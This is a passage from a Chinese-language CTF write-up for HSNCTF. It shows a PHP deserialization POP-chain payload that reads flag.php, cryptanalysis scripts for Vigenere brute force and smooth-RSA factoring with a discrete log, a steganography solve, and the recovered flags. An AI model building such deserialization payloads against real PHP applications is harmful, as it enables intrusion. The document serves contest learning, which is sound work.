class="hljs-variable">$red1</span>);<br></code></pre></td></tr></table></figure><p>POC:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;red&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;r1&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;white&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;w&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;color&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;c1&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blue&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;b1&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;red&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;r1&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;color&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;c1&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;&#125;&#125;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;b2&quot;</span>;N;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img.katck.com/images/2023/01/15/aad6bb29408cba2dcaf5b7dd81fdeaab.png" alt="aad6bb29408cba2dcaf5b7dd81fdeaab.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="daobudao"><a href="#daobudao" class="headerlink" title="daobudao"></a>daobudao</h3><p>base64之后凯撒</p><h3 id="brute-vigenere"><a href="#brute-vigenere" class="headerlink" title="brute_vigenere"></a>brute_vigenere</h3><p>题目明示爆破就完事了，维吉尼亚密码表中多加了个<code>&#123;&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> itertools<br> <br>dicts = string.ascii_lowercase + <span class="hljs-string">&quot;&#123;&#125;&quot;</span><br>enc = <span class="hljs-string">&#x27;&#123;mvjk&#125;gbxyiutfchpm&#125;ylm&#125;a&#125;amuxlmg&#x27;</span><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span>  itertools.product(dicts, repeat=<span class="hljs-number">4</span>):<br>    key = <span class="hljs-string">&#x27;&#x27;</span>.join(k)<br>    enc_index = [dicts.index(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc]<br>    key_index = [dicts.index(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> key]<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>        ans = (enc_index[i] - key_index[i % <span class="hljs-number">4</span>]) % <span class="hljs-number">28</span><br>        flag += dicts[ans]<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hsnctf&#123;&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#output:hsnctf&#123;wecanalwaystrustvigenere&#125;</span><br></code></pre></td></tr></table></figure><h3 id="smooth-rsa"><a href="#smooth-rsa" class="headerlink" title="smooth_rsa"></a>smooth_rsa</h3><p>通过gen_primes()和genkey()生成素数和公钥。</p><p>有趣的是flag被分成两部分，第二部分使用$e^{m_2}\ mod\ n$加密</p><p><img src="https://img.katck.com/images/2023/01/15/a5373fc4c2f59f490da29d1fa720835a.png" alt="a5373fc4c2f59f490da29d1fa720835a.png" style="zoom:67%;" /></p><p>根据素数生成的函数判断，p-1光滑，根据Pollard’s p-1算法分解N。获得前半部分flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">Pollards_p_1</span>(<span class="hljs-params">N</span>):<br>    a = <span class="hljs-number">2</span><br>    n = <span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        a = <span class="hljs-built_in">pow</span>(a, n, N)<br>        res = gmpy2.gcd(a-<span class="hljs-number">1</span>, N)<br>        <span class="hljs-keyword">if</span> res != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> res != N:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n =&#x27;</span>, n)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p =&#x27;</span>, res)<br>            <span class="hljs-keyword">return</span> res<br>        n += <span class="hljs-number">1</span>    <br><br><br>n = <span class="hljs-string">&#x27;&#x27;</span><br>c = <span class="hljs-string">&#x27;&#x27;</span><br>e = <span class="hljs-number">0x10001</span><br>p = Pollards_p_1(n)<br>q = n // p<br>d = gmpy2.invert(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br>output:<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 519863</span><br><span class="hljs-string">p = 153745976376847545241555912669157347880949716526722039650361779744915868188863264992722345501177873099593695231122873134365290651521444093220273133944427674631580854029267432922015034145356597048170793885604683602766372487332360313195898198870590532683023388212411561733101072884414575984089097280339407299863</span><br><span class="hljs-string">b&#x27;HSNCTF&#123;015f0d60fab48&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>另一半通过有限域内求离散对数获得</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sage: p = 153745976376847545241555912669157347880949716526722039650361779744915868188863264992722345501177873099593695231122873134365290651521444093220273133944427674631580854029267432922015034145356597048170793885604683602766372487332360313195898198870590532683023388212411561733101072884414575984089097280339407299863<br>sage: <span class="hljs-attribute">G</span>=GF(p)<br>sage: <span class="hljs-attribute">g</span>=G(65537)<br>sage: <span class="hljs-attribute">c</span>=889007651662506403203783493267282257215988729179620082971032093479384814992266823808192587257794931781622242482548202684315610166947125782056641835890542545830029903217817561269310184963519900268026434414254409767043528083064767018130469968738966212268513325090645430187706207887862845389628550171196492124556219364186293306935140349363837175430616647997752033400818089096772569695030947505437436792691260570218211502426593061096955991144063055944016658538765609416477033433728682889456364449301289731877176395077152830024245111711011732884071448942050549470148093802410710200714874231484059368826458031775976862475L<br>sage: discrete_log(c,g)<br>567361900135895770360389450735093365969913930365<br><br><span class="hljs-comment">#cac3408d5a83a64010b&#125;</span><br></code></pre></td></tr></table></figure><p>HSNCTF{015f0d60fab48cac3408d5a83a64010b}</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>签到题直接公众号签到获得flag</p><h3 id="外星电波"><a href="#外星电波" class="headerlink" title="外星电波~"></a>外星电波~</h3><p>flag.zip 中发现 flag.rar 中发现 flag.txt</p><p>明显的base64，解码后发现PK开头，保存为download.zip</p><p>download.zip中存在key.txt，但需要密码。</p><p>之前就发现flag.rar有2.36M但是能看到的内容之后flag.txt，大小不一致，怀疑隐藏东西了</p><p>将rar的文件头改成0x74，表示文件块，才可以正确显示文件（改了好几个）</p><p><img src="https://img.katck.com/images/2023/01/15/005964f4538d87cb374d6e1a809ec795.png" alt="005964f4538d87cb374d6e1a809ec795.png" style="zoom:67%;" /></p><p>之后可以在压缩包中查看到ACL和STM两个文件</p><p><img src="https://img.katck.com/images/2023/01/15/8d24add3c1d285a1c83e12d068101492.png" alt="8d24add3c1d285a1c83e12d068101492.png" style="zoom: 50%;" /></p><p>后来发现NTFS隐写也是可以的</p><p><img src="https://img.katck.com/images/2023/01/15/f599e49329e00302da52eeede036020b.png" alt="f599e49329e00302da52eeede036020b.png" style="zoom: 50%;" /></p><p>通过010 editor查看发现STM是一个音频文件，改后缀后打开听了像是卫星信号，结合题目。直接使用RX-SSTV开始听</p><p><img src="https://img.katck.com/images/2023/01/15/6fab5491d5a9758ef38f8cd05eb232eb.png" alt="6fab5491d5a9758ef38f8cd05eb232eb.png" style="zoom:50%;" /></p><p>获得疑似密码的东西，想到之前key.txt需要密码，获得flag</p><p><img src="https://img.katck.com/images/2023/01/15/74cb65ee6ad22186dcde691c70f7dad4.png" alt="74cb65ee6ad22186dcde691c70f7dad4.png" style="zoom:50%;" /></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
